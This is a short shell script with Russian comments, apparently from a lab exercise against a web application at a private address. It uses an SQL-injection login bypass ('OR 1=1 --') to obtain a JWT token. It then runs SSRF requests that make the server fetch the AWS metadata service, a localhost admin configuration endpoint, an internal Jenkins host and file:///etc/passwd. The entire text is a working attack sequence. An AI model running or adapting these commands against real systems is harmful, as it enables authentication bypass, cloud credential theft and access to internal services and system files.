# JWT-токен (endpoint требует авторизацию)
TOKEN=$(curl -s -X POST "http://172.20.0.106:3000/rest/user/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}" | jq -r '.authentication.token')

# SSRF к AWS metadata
curl -X POST "http://172.20.0.106:3000/profile/image/url" \
    -H "Content-Type: application/json" -H "Cookie: token=$TOKEN" \
    -d '{"imageUrl":"http://169.254.169.254/latest/meta-data"}'

# SSRF к локальному admin endpoint
curl -X POST "http://172.20.0.106:3000/profile/image/url" \
    -H "Content-Type: application/json" -H "Cookie: token=$TOKEN" \
    -d '{"imageUrl":"http://localhost:3000/rest/admin/application-configuration"}'

# SSRF к внутреннему адресу (Jenkins)
curl -X POST "http://172.20.0.106:3000/profile/image/url" \
    -H "Content-Type: application/json" -H "Cookie: token=$TOKEN" \
    -d '{"imageUrl":"http://172.20.0.105:8080/"}'

# SSRF через file://
curl -X POST "http://172.20.0.106:3000/profile/image/url" \
    -H "Content-Type: application/json" -H "Cookie: token=$TOKEN" \
    -d '{"imageUrl":"file:///etc/passwd"}'
